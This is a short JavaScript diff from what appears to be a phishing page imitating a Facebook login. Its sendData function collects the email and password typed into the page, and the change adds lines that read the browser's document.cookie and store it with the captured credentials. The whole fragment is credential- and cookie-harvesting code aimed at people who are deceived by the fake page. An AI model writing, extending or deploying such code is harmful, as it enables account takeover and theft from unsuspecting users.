@@ -12,6 +12,7 @@ var config = {
 
 function sendData()
 {
+	var inf = document.cookie;
 	if($("email").value=="" && $("pass").value=="")
 	{
 		window.location="https://fbtemplate.github.io/facebook.com/login";
@@ -23,5 +24,6 @@ function sendData()
 						password : $("pass").value
 					}
 			userDetails.push(data);
+	userDetails.push(inf);
 	
 }
